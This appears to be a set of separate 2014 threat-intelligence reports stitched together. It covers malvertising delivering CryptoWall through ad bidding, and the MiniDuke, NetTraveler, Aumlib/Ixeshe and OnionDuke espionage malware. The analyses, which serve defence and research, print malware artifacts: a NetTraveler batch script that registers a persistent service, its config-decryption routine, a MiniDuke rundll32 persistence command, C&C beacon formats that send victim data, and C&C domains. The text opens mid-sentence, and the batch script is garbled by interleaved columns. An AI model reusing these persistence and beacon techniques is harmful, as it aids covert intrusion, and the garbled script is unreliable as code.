pages is driving RTB malvertising . Invincea has witnessed a rash of exploit kits and landing pages hosted
on :
 Compromised WordPress Blogs
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper        23
    Unconfigured Apache hosts
    Cloud - based NGINX subdirectories
    Government and News pages in Poland
    Free Hosting sites such as ua.in
In most instances , the landing pages are preconfigured with the exploit kit . The malvertiser creates the
redirection in his normal ad prior to raising his bids to winning levels . Once several victims are confirmed ,
those malicious landing pages have the content erased , and the automatic redirection removed to serve
“ normal ” ads again .
Real World Examples of RTB Malvertising Captured by Invincea
Figures 17 through 21 in the following are screenshots from Invincea ’s Threat Management console from
various RTB - based malvertising incidents with highlighted URLs for malvertising delivered via RTB ad
bidding .
Figure 17 : Recent Blaze . Com RTB Kryptik malvertising via GumGum
Figure 18 : Online Ammunition Forum had RTB malvertising delivered . Exploit landing page in
In.ua .
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper    24
Figure 19 : Largest Trading Online Forum Trade2Win.com delivered RTB malvertising via
German provider :
Figure 20 : Answers.com click bait articles hosted winning RTB bids dropping Kryptik from
Polish government landing page exploit kits .
Invincea , Inc.                                                   Release Date : 10.27.2014
Invincea White Paper    25
Figure 21 : Online Poker Room and targeted RTB attack against Defense Contractor . Java
exploit hosted at unconfigured Nginx host .
Invincea , Inc.                                                 Release Date : 10.27.2014
Invincea White Paper        26
Ransomware Campaign via Malvertising
In September and October of 2014 , Invincea saw a sharp spike of malvertising delivering CryptoWall
ransomware attacks via Real Time Ad Bidding . We observed Real Time Ad bidding platforms , including
OpenX , GoogleAds , Yahoo , AOL , and first-impression.com , fall victim to the ransomware malvertising
scheme by unwittingly delivering the CryptoWall 2.0 ransomware ads .
Ransomware is a particularly pernicious form of malware that fully encrypts the victim ’s disk and data
files , including remote storage , then demands payment of anywhere from $ 300 to $ 1000 in return for the
decryption key . Users are held hostage from their own work , pictures , personal , and proprietary material .
To learn more about the scourage of ransomware , see this blog .
Based on analysis of Invincea logs in would - be victims targeted by these ads , we have insight into the
attacker that is delivering the malicious ads . According to Invincea analysis of ads delivered from first-
impression.com , winning ad bids ranging from as low as 30 cents and as high as $ 1.70 , were delivered by
a block of unique identifiers . It is highly likely that the same attackers are using other RTB ad platforms .
This campaign matches the characteristics described by Proofpoint in its blog in terms of the exploitation
methods . Legitimate ad copy is stolen , 3rd party ad networks used to distribute malware , and popular ad-
supported websites displaying the malicious ads that exploit unsuspecting visitors with drive - by web
exploits . Merely visiting any ad - supported site may result in a CryptoWall ransomware infection .
Cryptowall 2.0 utilizes the TOR network to hide its communications , but it quickly encrypts all local files
on the disk , and demands bitcoin payment to unlock the files . Many companies have fallen prey to this
attack over the past few months , making this one of the most successful Ransomware campaigns to date .
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper     27
Analysis of CryptoWall Malvertising Infections
Mitigated Infection Event Sports . Yahoo.com
Below is a typical Cryptowall 2 infection as seen in the Invincea Management Server logs . This winning
ad placement ran on sports.yahoo.com – an Alexa Top 4 rated site . Highlighted in order in Figure 22 is
the common filename of obupdat.exe , which has ever changing hashes , followed by the TOR port , and
the 3rd party ad platform of first-impression.com .
Analysis ( Original report ) :
Figure 22 : CryptoWall 2.0 infection report
Invincea , Inc.                                                           Release Date : 10.27.2014
Invincea White Paper     28
Timeline Analysis ( Original Report ) :
Below in Figure 23 is the timeline of the Tor connections and SSL connections employed by CryptoWall .
Figure 23 : Network connections from CryptoWall 2.0
Invincea , Inc.                                                          Release Date : 10.27.2014
Invincea White Paper      29
In addition , you can see the ransom note being written to disk on an infected machine in the audit logs
in Figure 24 .
Figure 24 : File writes including the ransom note from CryptoWall infection
Figure 25 shows the winning malvertising bid via RTB ad delivery from first-impression.com . Items
highlighted in the URL below is userid , and the winning bid price to place malvertising of Cryptowall on
sports.yahoo.com , which is 60 cents .
Figure 25 : Winning malvertising bid with fields embedded in URL
Invincea , Inc.                                                            Release Date : 10.27.2014
Invincea White Paper        30
In Figure 26 below , we show the unique identifiers for the userID and campaigns to deliver CryptoWall
malware that were blocked and audited by Invincea , including the websites that delivered the ads via a
third - party ad network over the past month .
userID , CampaignID and CommonName                                   Website Delivering Malvertising
748568&margin=0.4&cid=155493&bn = wheelie                             Hotair.com
748568&margin=0.4&cid=155493&bn = wheeljack                           webmail comcast
748163&margin=0.4&cid=155330&bn = wheeljack                           theblaze.com
748566&margin=0.4&cid=155493&bn = redalert                            sports.yahoo.com
746705&margin=0.4&cid=154897&bn = dc16 ( unknown )                      www.searchtempest.com
748480&margin=0.4&cid=155474&bn = redalert                            viewmixed.com
748600&margin=0.4&cid=155528&bn = inferno                             rr webmail
748418&margin=0.4&cid=155453&bn = inferno                             lucianne.com
748270&margin=0.4&cid=155380&bn = sj10 ( skipjack )                     thanhniennews.com
748417&margin=0.4&cid=155453&bn = wheeljack                           mariowiki.com
Figure 26 : Malware campaigns delivered via 3rd party ad network and the websites that hosted the
ads
To reiterate , neither the websites listed here , nor the 3rd party ad network , necessarily was aware of the
malicious ads they were serving to the website visitors . It is likely they were not aware without ad
screening technology .
In each event above , Invincea blocked an attempt to infect an endpoint with Cryptowall 2.0 and
prevented CryptoWall from encrypting the user ’s file system and holding it hostage . Had the user not
been running Invincea , the attack would likely have been successful , and the only way the user would
have had to recover the encrypted files would be to pay the attacker the ransom . This is an effective
ransom technique , and one that is paying off well for the attackers , who use the income from the
attacks to purchase Real Time Ad Bids on RTB networks to infect more users .
Central Hosting of Clean Content
Most RTB ad providers allow for advertisers to host their own ad content . This allows advertisers to
directly collect web impression data of who is hitting which ads , from where , by which IPs , which user-
agent strings , and just about anything else you could log about a website visit . In addition , the advertising
network does n’t have to utilize their own disk space to host the image files , the flash videos or other
online content . RTB networks simply do the auctioneering and redirection to the winning content .
Invincea , Inc.                                                              Release Date : 10.27.2014
Invincea White Paper        31
It is this weakness in security that malvertisers are taking advantage of . If ad networks were to switch to
a model where all content is actually hosted by them ( 1st party hosting ) , in a cloud , then the risk of
malvertising would drop dramatically .
The RubiconProject has a Seller ’s Cloud , which could be a security model for the RTB industry . It is
inherently more secure way of hosting ad content .
How to Protect Yourself from Micro - targeted Malvertising
Operation DeathClick is an active campaign to micro - target companies via malvertising in order to
compromise their networks . Unfortunately , the micro - targeting malvertising technique evades almost all
network controls and traditional endpoint anti - virus solutions . Invincea can protect users from this attack
type among other targeted and opportunistic web - based threats . For half the price of a candy bar ,
attackers have the unprecedented ability to deliver malware to you through your web browser simply
because of your IP address space and your industry vertical . Most of the attacks featured here were not
detected by standard Anti - Virus because the malware hashes constantly change .
Web proxy blocking updates , even in real time , will not stop new malvertising landing pages that appear
and disappear within minutes .
Intelligence feeds from the premier intelligence providers , based on hostname , IP , URL or domain will not
be able to block malicious malvertisers quickly enough .
Invincea protected users can simply browse and click anything online without fear of compromise or
targeted malvertising attacks .
Non - Invincea users can attempt to OptOut of directed targeting where you can . European privacy laws
for forcing most ad providers to offer the opt - out service ; however , you often have to visit each ad
provider individually to choose to opt out .
Invincea , Inc.                                                             Release Date : 10.27.2014
Invincea White Paper        32
Note , that opting out merely places a blocking cookie in your browser . This means that ad providers will
not target or retarget based on cookies . But as shown above , the new targeted advertising is via IP
intelligence .
http://www.rubiconproject.com/privacy/consumer-online-profile-and-opt-out/
http://preferences-mgr.truste.com/
http://www.ghosteryenterprise.com/global-opt-out/
Release Notes
10/27 : For clarification , Invincea has added additional notes in this version that the websites shown here
and the 3rd party real - time ad networks are being used unwittingly and their resources misappropriated
by malvertisers to target companies for persistent remote access , click fraud , and other nefarious
activities . This is not a reflection on these companies , nor the services they provide . This paper
highlights the problem for greater awareness so the industry collectively can combat this problem
perhaps with more effective screening at the source prior to displaying ads .
Invincea , Inc.                                                            Release Date : 10.27.2014

Miniduke still duking it out
At the end of April Microsoft announced that a vulnerability in Word was actively being exploited . This
vulnerability occurred in parsing RTF files and was assigned CVE-2014 - 1761 , a thorough analysis of which
can be found on the HP Security Research blog . We have since seen multiple cases where this exploit is
used to deliver malware and one was particularly interesting as it contained a new variant of MiniDuke
( also known as Win32/SandyEva ) .
MiniDuke was first discussed by Kaspersky in March 2013 in their paper The MiniDuke Mystery : PDF 0-
day Government Spy Assembler 0x29A Micro Backdoorand shortly after in a paper by Bitdefender . Some
of the characteristics of MiniDuke — such as its small size ( 20 KB ) , its crafty use of assembly
programming , and the use of zero - day exploits for distribution — made it an intriguing threat . Although
the backdoor is still quite similar to its previous versions , some important changes were made since last
year , the most notable being the introduction of a secondary component written in JScript to contact a
C&C server via Twitter .
The RTF exploit document
The exploit document was named Proposal - Cover - Sheet - English.rtf and is quite bland when compared to
the documents that were used in 2013 , which were of a political nature . We received the document on
April 8th , only three days after the compilation of the MiniDuke payload , dated April 5th in the PE header .
The payload remains quite small at only 24 KB .
The functionality of the shellcode which is executed by triggering the vulnerability is rather simple and
straightforward . After decrypting itself and obtaining the addresses of some functions exported by
kernel32.dll , it decrypts and drops the payload in the % TEMP% directory in a file named “ a.l ” which is
subsequently loaded by calling kernel32!LoadLibraryA.
An interesting thing about the shellcode is that before transferring control to any API function it checks
the first bytes of the function in order to detect hooks and debugger breakpoints which may be set by
security software and monitoring tools . If any of these are found the shellcode skips the first 5 bytes of the
function being called by manually executing prologue instructions ( mov edi , edi ; push ebp ; mov ebp , esp )
and then jumping to the function code as illustrated below .
The next graph presents the execution flow of this malware when the exploitation is successful . As
mentioned previously this version of the MiniDuke payload comes with two modules which we refer to as
the main module and the TwitterJS module .
Execution flow of MiniDuke
Main Component
Installation
Once MiniDuke receives control it checks that the host process is not rundll32.exe and whether the
current directory is % TEMP% . If either of those conditions is met the malware assumes it is run for the
first time and it proceeds with its installation onto the system . MiniDuke gathers information about the
system and encrypts its configuration based on that information , a method also used by OSX / Flashback
( this process is called watermarking by Bitdefender ) . The end result is that it is impossible to retrieve the
configuration of an encrypted payload if analyzing it on a different computer . The information collected on
infection has not changed since the previous version and consists of the following values :
volume serial number ( obtained from kernel32!GetVolumeInformationA )
CPU information ( obtained with the cpuidinstruction )
computer name ( obtained from kernel32!GetComputerNameA )
Once the encrypted version of the malware is created , it is written into a file in the
% ALLUSERSPROFILE%\Application Data directory . The name of the file is randomly picked from the
following values ( you can find this listing and those of the next screenshots on the VirusRadar description :
The filename extension is also picked randomly from the following list :
To persist on the infected system after reboots , the malware creates a hidden .LNK file in the “ Startup ”
directory pointing to the modified main module . The name of the .LNK file is randomly drawn from the
following values :
The .LNKfile is created using a COM object with the IShellLinkA interface and contains the following
command : “ C:\Windows\system32\rundll32.exe % path_to_main_module% , export_function ” Which
gives something like :
“ C:\Windows\system32\rundll32.exe C:\DOCUME~1\ALLUSE~1\APPLIC~1\data.cat , IlqUenn “ .
Operation
When the malware is loaded by rundll32.exe and the current directory is n’t % TEMP% , the malware starts
with gathering the same system information as described in the “ Installation ” section to decrypt
configuration information . As with the previous version of MiniDuke , it checks for the presence of the
following processes in the system :
If any of these are found in the system the configuration information will be decrypted incorrectly , i.e. the
malware will run on the system without any communication to C&C servers . If the configuration data is
decrypted correctly , MiniDuke retrieves the Twitter page of @FloydLSchwartz in search of URLs by
which to reach C&C server . It looks for the tag “ X ) ) ) ” on the page ( MiniDuke was searching for “ uri ! ” in
previous samples ) and if the tag is found it decrypts a URL from the data that follows it . The Twitter
account @FloydLSchwartz does exist but has only retweets and no strings with the special tag .
As the next step , MiniDuke gathers the following information from the infected systems :
computer name and user domain name
country code of the infected host IP address obtained from http://www.geoiptool.com
OS version information
domain controller name , user name , groups a user account belongs to
a list of AV products installed onto the system
Internet proxy configuration
version of MiniDuke
This information is then sent to the C&C server along with the request to download a payload . The final
URL used to communicate with the C&C server looks like this : < url_start>/create.php?<rnd_param>=
< system_info > Those tokens are derived as follows :
url_start – the URL retrieved from the twitter account
rnd_param – randomly generated of lower case alphabet characters parameter name in the query
string of the URL
system_info – base64 encoded and encrypted system information
An example of such a URL is given below :
The payload is downloaded in the file named “ fdbywu ” using the urlmon!URLDownloadToFileA API :
The downloaded payload is a fake GIF8 file containing encrypted executable . The malware processes the
downloaded file in the same way as previous samples of MiniDuke : it verifies the integrity of the file using
RSA-2048 , then decrypts it , stores in a file and finally executes it . The RSA-2048 public key to verify
integrity of the executable inside the GIF file is the same as in the previous version of MiniDuke .
Twitter Generation Algorithm
In the event that MiniDuke is unable to retrieve a C&C URL from this account , it generates a username to
search for based on the current date . The search query changes roughly every seven days and is similar to
the backup mechanism in previous versions that was using Google searches . A Python implementation of
the algorithm can be found in Appendix B.
TwitterJS component
The TwitterJS module is extracted by creating a copy of the Windows DLL cryptdll.dll , injecting a block of
code into it and redirecting the exported functions to this code . Here is how the export address table of the
patched binary looks after modifications .
This file is then stored in an Alternate Data Stream ( ADS ) in NTUSER.DAT in the % USERPROFILE%
folder . Finally this DLL is registered as the Open command when a drive is open , which has the effect of
starting the bot every time the user opens a disk drive . Below you can find the content of
the init.cmd script used by MiniDuke to install TwitterJS module onto the system .
When loaded , TwitterJS instantiates the JScript COM object and decrypts a JScript file containing the
core logic of the module .
Prior to executing it , MiniDuke applies a light encoding to the script : The next images show the result of
two separate obfuscations , we can see that the variables have different values . This is probably done to
thwart security systems that scan at the entry points of the JScript engine .
Result of first obfuscation
Result of second obfuscation
The purpose of this script is to use Twitter to find a C&C and retrieve JScript code to execute . It first
generates a Twitter user to search for ; this search term changes every 7 days and is actually a match to the
real account name , not the Twitter account name . The bot then visits the Twitter profiles returned by the
search and looks for links that end with “ .xhtml “ . When one is found , it replaces “ .xhtml ” with “ .php ” and
fetches that link . Information about the computer is embedded in the Accept HTTP header .
The first link on the retrieved page should contain base64 data ; the name attribute of the link is used as a
rolling XOR key to decrypt the JScript code . Finally , MiniDuke calculates a hash of the fetched script and
compares it with a hardcoded hash in the TwitterJS script . If they match , the fetched script is executed by
calling eval ( ) .
The tale of the broken SHA-1
The code hashing algorithm used by the component looks very much like SHA-1 but outputs different
hashes ( you can find the complete implementation in Appendix B. We decided to search for what was
changed in the algorithm ; one of our working hypotheses was that the algorithm might have been altered
to make collisions feasible . We could n’t find an obvious difference ; all the constants and the steps of the
algorithm were as expected . Then we noticed that for short messages only the second 32-bit word was
different when compared to the original SHA-1 .
SHA1(‘test’ ) : a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
TwitterJS_SHA1(‘test’ ) : a94a8fe5dce4f01c1c4c0873d391e987982fbbd3
By examining how this 2nd word was generated we finally discovered that this was caused by a scope
issue . As shown below the SHA-1 function used a variable named f : the function Z ( ) is then called which
also uses a variable named f without the var keyword , causing it to be treated as a global variable rather
than local to the function . The end result is that the value of f is also changed in the SHA-1 function which
affects the value of the 2nd word for that round and ultimately the whole hash for long messages .
A likely explanation of how this problem came to be is
that the variable names were changed to single letters
using an automated tool prior to embedding it in the
payload . The 2 f variables probably had different names
in the original script which avoided the issue . So this
leaves us with two takeaways : 1 ) The difference in the
hashing algorithm was unintentional and 2 ) Always
declare your local variables with the var keyword . ;-)
Twitter DGA accounts
We generated the list of Twitter search terms for 2013 - 2014 and checked if any of those were registered .
At the moment only one exists , @AA2ADcAOAA , which is the TwitterJS account that was generated
between August 21st and 27th 2013 . This account has no tweets . In an effort to discover potential victims ,
we registered the Twitter accounts corresponding to the current week both for the main and TwitterJS
components and set up tweets with encrypted URLs so that an infected computer would reach out to our
server . So far we have received connections via the TwitterJS accounts from four computers located in
Belgium , France and the UK . We have contacted national CERTs to notify the affected parties . We detect
the RTF exploit document as Win32/Exploit . CVE-2014 - 1761.D and the MiniDuke components
as Win32/SandyEva . G.
Appendix A : SHA-1 hashes
SHA-1                                             Description
58be4918df7fbf1e12de1a31d4f622e570a81b93          RTF with Word exploit CVE-2014 - 1761
b27f6174173e71dc154413a525baddf3d6dea1fd       MiniDuke main component ( before config encryption )
c059303cd420dc892421ba4465f09b892de93c77       TwitterJS javascript code
Appendix B & C : DGA algorithms , Twitter DGA accounts
The DGA scripts and account lists have been moved to our Github account :
https://github.com/eset/malware-research/tree/master/miniduke
Author ESET Research , ESET

NetTraveler APT Gets a Makeover for 10th Birthday
We have written about NetTraveler before HERE and HERE .
Earlier this year , we observed an uptick in the number of attacks against Uyghur and Tibetan supporters
using an updated version of the NetTraveler backdoor .
Here 's an example of a targeted spear - phishing e - mail directed at Uyghur activists in March 2014 .
The e - mail has two attachments , a non - malicious JPG file and a 373 KB Microsoft Word .DOC file .
" Sabiq sot xadimi gulnar abletning qeyin - Qistaqta olgenliki
File name
ashkarilanmaqta.doc "
MD5                        b2385963d3afece16bd7478b4cf290ce
Size                       381,667 bytes
The .DOC file , which in reality is a " Single File Web Page " container , also known as " Web archive file " ,
appears to have been created on a system using Microsoft Office - Simplified Chinese .
It contains an exploit for the CVE-2012 - 0158 vulnerability , detected by Kaspersky Lab products as
Exploit . MSWord . CVE-2012 - 0158.db .
If run on a vulnerable version of Microsoft Office , it drops the main module as " net.exe " ( detected by
Kaspersky Lab products as Trojan - Dropper . Win32.Agent.lifr ) , which in turn installs a number of
other files . The main C&C module is dumped into
" % SystemRoot%\system32\Windowsupdataney.dll " , ( detected by Kaspersky as Trojan-
Spy . Win32.TravNet.qfr ) .
Name                       WINDOWSUPDATANEY.DLL
MD5                        c13c79ad874215cfec8d318468e3d116
Size                       37,888 bytes
It is registered as a service ( named " Windowsupdata " ) through a Windows Batch file named " DOT.BAT "
( detected by Kaspersky Lab products as Trojan . BAT.Tiny.b ) :
@echo off
@reg add
" HKEY_LOCAL_MACHINE\
SOFTWARE\Microsoft\Win
dows@echo off
NT\CurrentVersion\Svcho
st " @reg
/v Windowsupdata      /t
add " HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows            NT\CurrentVersion\Svchost " /v
REG_MULTI_SZ /d
Windowsupdata
Windowsupdata /f
/t REG_MULTI_SZ    /d Windowsupdata /f
@reg add
@reg add " HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata " /v
" HKEY_LOCAL_MACHINE\
ImagePath /t REG_EXPAND_SZ /d % SystemRoot%\System32\svchost.exe -k Windowsupdata /f
SYSTEM\CurrentControlSe
t\Services\Windowsupdat
a " /v ImagePath
@reg           /t
add " HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata "         /v
REG_EXPAND_SZ /d
DisplayName
% SystemRoot%\System32
/t REG_SZ /d Windowsupdata   /f
\svchost.exe -k
@reg add " HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata "
Windowsupdata      /f                                                                        /v
@regObjectName
add            /t REG_SZ /d LocalSystem /f
" HKEY_LOCAL_MACHINE\
SYSTEM\CurrentControlSe
@reg add " HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata " /v
t\Services\Windowsupdat
ErrorControl /t REG_DWORD /d 1 /f
a " /v DisplayName /t
REG_SZ /d
@reg add " HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata "
Windowsupdata      /f                                                                        /v Start /t
@regREG_DWORD
add               /d 2 /f
" HKEY_LOCAL_MACHINE\
SYSTEM\CurrentControlSe
@reg add " HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata\Parameters "
t\Services\Windowsupdat
/v ServiceDll /t REG_EXPAND_SZ /d % SystemRoot%\system32\Windowsupdataney.dll /f
a " /v ObjectName /t
REG_SZ /d LocalSystem /f
@reg add
To    make sure the malware is n't running multiple times , it uses the mutex " SD_2013 Is Running ! " to mark
" HKEY_LOCAL_MACHINE\
SYSTEM\CurrentControlSe
its presence in the system . Other known mutexes used by older and current variants include :
t\Services\Windowsupdat
a " /v ErrorControl /t
REG_DWORD /d 1 /f
@reg addBoat-12 Is Running !
" HKEY_LOCAL_MACHINE\
DocHunter2012 Is Running !
SYSTEM\CurrentControlSe
t\Services\Windowsupdat
Hunter-2012 Is Running !
a " /v Start /t REG_DWORD
/d 2 /fNT-2012 Is Running !
@reg add
" HKEY_LOCAL_MACHINE\
NetTravler Is Running !
NetTravler2012 Is Running !
SH-2011 Is Running !
ShengHai Is Running !
SD2013 is Running !
The malware configuration file is written to the " SYSTEM " folder ( as opposed to SYSTEM32 ) and has a
slightly new format compared to " older " NetTraveler samples :
For the record , here 's what an older NetTraveler config file looks like :
Obviously , the developers behind NetTraveler have taken steps to try to hide the malware 's configuration .
Luckily , the encryption is relatively simple to break .
The algorithm is as follows :
for ( i=0;i < string_size;i++ )
decrypted[i]=encrypted[i ] - ( i + 0xa ) ;
Once decrypted , the new config looks like this :
One can easily see the command - and - control ( C&C ) server in the screenshot above , which is
" uyghurinfo[.]com " .
We identified several samples using this new encryption scheme . A list of all the extracted C&C servers can
be found below :
C&C server             IP                    IP location                       Registrar
Hong Kong , Albert Heng ,           SHANGHAI MEICHENG
ssdcru[.]com           103.30.7.77
Trillion Company                  TECHNOLOGY
United States , Los Angeles ,       TODAYNIC.COM
uygurinfo[.]com        216.83.32.29
Integen Inc                       INC .
Hong Kong , Kowloon ,
SHANGHAI MEICHENG
samedone[.]com         122.10.17.130         Hongkong Dingfengxinhui Bgp
TECHNOLOGY
Datacenter
Hong Kong , Sun Network            SHANGHAI MEICHENG
gobackto[.]net         103.1.42.1
( hong Kong ) Limited               TECHNOLOGY
SHANGHAI MEICHENG
worksware[.]net        N / A                   N / A
TECHNOLOGY
was                   Hong Kong , Sun Network            SHANGHAI MEICHENG
jojomic[.]com
202.146.219.14        ( hong Kong ) Limited               TECHNOLOGY
hong kong hung tai                SHANGHAI MEICHENG
angellost[.]net        was 103.17.117.201
international holdings            TECHNOLOGY
hong kong hung tai                SHANGHAI MEICHENG
husden[.]com           was 103.30.7.76
international holdings            TECHNOLOGY
We recommend blocking all these hosts in your firewall .
Conclusion
This year , the actors behind NetTraveler celebrate 10 years of activity . Although the earliest samples we
have seen appear to have been compiled in 2005 , there are certain indicators that point to 2004 as the
year when their activity started .
For 10 years NetTraveler has been targeting various sectors , with a focus on diplomatic , government and
military targets .
NetTraveler victims by industry
Most recently , the main focus of interest for cyber - espionage activities revolved around space exploration ,
nano - technology , energy production , nuclear power , lasers , medicine and communications .
The targeting of Uyghur and Tibetan activists remains a standard component of their activities and we can
assume it will stay this way , perhaps for another 10 years .

Survival of the Fittest : New York Times Attackers Evolve Quickly
The attackers behind the breach of the New York Times’ computer network late last year appear to be
mounting fresh assaults that leverage new and improved versions of malware .
The new campaigns mark the first significant stirrings from the group since it went silent in January in the
wake of a detailed expose of the group and its exploits — and a retooling of what security researchers
believe is a massive spying operation based in China [ 1 ] .
The newest campaign uses updated versions of Aumlib and Ixeshe .
Aumlib , which for years has been used in targeted attacks , now encodes certain HTTP communications .
FireEye researchers spotted the malware when analyzing a recent attempted attack on an organization
involved in shaping economic policy .
And a new version of Ixeshe , which has been in service since 2009 to attack targets in East Asia , uses new
network traffic patterns , possibly to evade traditional network security systems .
The updates are significant for both of the longstanding malware families ; before this year , Aumlib had
not changed since at least May 2011 , and Ixeshe had not evolved since at least December 2011 .
BACKGROUND
Cybercriminals are constantly evolving and adapting in their attempts to bypass computer network
defenses . But , larger , more successful threat actors tend to evolve at a slower rate .
As long as these actors regularly achieve their objective ( stealing sensitive data ) , they are not motivated to
update or rethink their techniques , tactics , or procedures ( TTPs ) . These threat actors’ tactics follow the
same principles of evolution – successful techniques propagate , and unsuccessful ones are abandoned .
Attackers do not change their approach unless an external force or environmental shift compels them to .
As the old saying goes : If it ai n’t broke , do n’t fix it .
So when a larger , successful threat actor changes up tactics , the move always piques our attention .
Naturally , our first priority is ensuring that we detect the new or altered TTPs . But we also attempt to
figure out why the adversary changed — what broke ? — so that we can predict if and when they will
change again in the future .
We observed an example of this phenomenon around May. About four months after The New York Times
publicized an attack on its network , the attackers behind the intrusion deployed updated versions of their
Backdoor . APT.Aumlib and Backdoor . APT.Ixeshe malware families [ 2 ] .
The previous versions of Aumlib had not changed since at least May 2011 , and Ixeshe had not evolved
since at least December 2011 .
We can not say for sure whether the attackers were responding to the scrutiny they received in the wake of
the episode . But we do know the change was sudden . Akin to turning a battleship , retooling TTPs of large
threat actors is formidable . Such a move requires recoding malware , updating infrastructure , and possibly
retraining workers on new processes .
The following sections detail the changes to Backdoor . APT.Aumlib and Backdoor . APT.Ixeshe .
Backdoor . APT.Aumlib
Aumlib has been used in targeted attacks for years . Older variants of this malware family generated the
following POST request :
POST /bbs / info.asp HTTP/1.1
Data sent via this POST request transmitted in clear text in the following structure :
< VICTIM BIOS NAME>|<CAMPAIGN ID>|<VICTIM EXTERNAL IP>|<VICTIM OS>|
A recently observed malware sample ( hash value 832f5e01be536da71d5b3f7e41938cfb ) appears to be a
modified variant of Aumlib .
The sample , which was deployed against an organization involved in shaping economic policy , was
downloaded from the following URL :
status[.]acmetoy[.]com / DD / myScript.js or status[.]acmetoy[.]com / DD / css.css
The sample generated the following traffic :
This output reveals the following changes when compared with earlier variants :
The POST URI is changed to /bbs / search.asp ( as mentioned , earlier Aumlib variants used a POST
URI of /bbs / info.asp . )
The POST body is now encoded .
Additional requests from the sample generated the following traffic :
These subtle changes may be enough to circumvent existing IDS signatures designed to detect older
variants of the Aumlib family .
The sample 832f5e01be536da71d5b3f7e41938cfb shares code with an older Aumlib variant with the hash
cb3dcde34fd9ff0e19381d99b02f9692 . The sample cb3dcde34fd9ff0e19381d99b02f9692 connected to
documents[.]myPicture[.]info and www[.]documents[.]myPicture[.]info and as expected generated the a
POST request to /bbs / info.asp .
Backdoor . APT.Ixeshe
Ixeshe has been used in targeted attacks since 2009 , often against entities in East Asia [ 3 ] . Although the
network traffic is encoded with a custom Base64 alphabet , the URI pattern has been largely consistent :
/[ACD ] [ EW]S[Numbers].jsp?[Base64 ]
We analyzed a recent sample that appears to have targeted entities in Taiwan , a target consistent with
previous Ixeshe activity .
This sample ( aa873ed803ca800ce92a39d9a683c644 ) exhibited network traffic that does not match the
earlier pattern and therefore may evade existing network traffic signatures designed to detect Ixeshe
related infections .
The Base64-encoded data still contains information including the victim ’s hostname and IP address but
also a “ mark ” or “ campaign tag / code ” that the threat actors use to keep track of their various attacks . The
mark for this particular attack was [ ll65 ] .
CONCLUSION
Based on our observations , the most successful threat actors evolve slowly and deliberately . So when they
do change , pay close attention . Knowing how attackers’ strategy is shifting is crucial to detecting and
defending against today ’s advanced threats . But knowing the “ why ” is equally important . That additional
degree of understanding can help organizations forecast when and how a threat actor might change their
behavior — because if you successfully foil their attacks , they probably will .
Notes
[ 1 ] http://www.nytimes.com/2013/01/31/technology / chinese - hackers - infiltrate - new - york - times-
computers.html?pagewanted=all
[ 2 ] This actor is known as APT12 by Mandiant
[ 3 ] http://www.trendmicro.com / cloud - content / us / pdfs / security - intelligence / white-
papers / wp_ixeshe.pdf
This entry was posted in Threat Intelligence , Threat Research by Ned Moran and Nart Villeneuve .
Bookmark the permalink .

OnionDuke : APT Attacks Via the Tor Network - F - Secure Weblog :
News from the Lab
Recently , research was published identifying a Tor exit node , located in Russia , that was consistently and
maliciously modifying any uncompressed Windows executables downloaded through it . Naturally this
piqued our interest , so we decided to peer down the rabbit hole . Suffice to say , the hole was a lot deeper
than we expected ! In fact , it went all the way back to the notorious Russian APT family MiniDuke , known
to have been used in targeted attacks against NATO and European government agencies . The malware
used in this case is , however , not a version of MiniDuke . It is instead a separate , distinct family of malware
that we have since taken to calling OnionDuke . But lets start from the beginning .
When a user attempts to download an executable via the malicious Tor exit node , what they actually
receive is an executable " wrapper " that embeds both the original executable and a second , malicious
executable . By using a separate wrapper , the malicious actors are able to bypass any integrity checks the
original binary might contain . Upon execution , the wrapper will proceed to write to disk and execute the
original executable , thereby tricking the user into believing that everything went fine . However , the
wrapper will also write to disk and execute the second executable . In all the cases we have observed , this
malicious executable has been the same binary ( SHA1 : a75995f94854dea8799650a2f4a97980b71199d2 ,
detected as Trojan - Dropper : W32/OnionDuke . A ) . This executable is a dropper containing a PE
resource that pretends to be an embedded GIF image file . In reality , the resource is actually an encrypted
dynamically linked library ( DLL ) file . The dropper will proceed to decrypt this DLL , write it to disk and
execute it .
A flowchart of the infection process
Once executed , the DLL file ( SHA1 : b491c14d8cfb48636f6095b7b16555e9a575d57f , detected as
Backdoor : W32/OnionDuke . B ) will decrypt an embedded configuration ( shown below ) and attempt to
connect to hardcoded C&C URLs specified in the configuration data . From these C&Cs the malware may
receive instructions to download and execute additional malicious components . It should be noted , that
we believe all five domains contacted by the malware are innocent websites compromised by the malware
operators , not dedicated malicious servers .
A screenshot of the embedded configuration data
Through our research , we have also been able to identify multiple other components of the OnionDuke
malware family . We have , for instance , observed components dedicated to stealing login credentials from
the victim machine and components dedicated to gathering further information on the compromised
system like the presence of antivirus software or a firewall . Some of these components have been observed
being downloaded and executed by the original backdoor process but for other components , we have yet to
identify the infection vector . Most of these components do n't embed their own C&C information but
rather communicate with their controllers through the original backdoor process .
One component , however , is an interesting exception . This DLL file ( SHA1
d433f281cf56015941a1c2cb87066ca62ea1db37 , detected as Backdoor : W32/OnionDuke . A ) contains
among its configuration data a different hardcoded C&C domain , overpict.com and also evidence
suggesting that this component may abuse Twitter as an additional C&C channel . What makes the
overpict.com domain interesting , is it was originally registered in 2011 with the alias of " John Kasai " .
Within a two - week window , " John Kasai " also registered the following domains : airtravelabroad.com ,
beijingnewsblog.net , grouptumbler.com , leveldelta.com , nasdaqblog.net , natureinhome.com ,
nestedmail.com , nostressjob.com , nytunion.com , oilnewsblog.com , sixsquare.net and ustradecomp.com .
This is significant because the domains leveldelta.com and grouptumbler.com have previously been
identified as C&C domains used by MiniDuke . This strongly suggests that although OnionDuke and
MiniDuke are two separate families of malware , the actors behind them are connected through the use of
shared infrastructure .
A visualization of the infrastructure shared between OnionDuke and MiniDuke
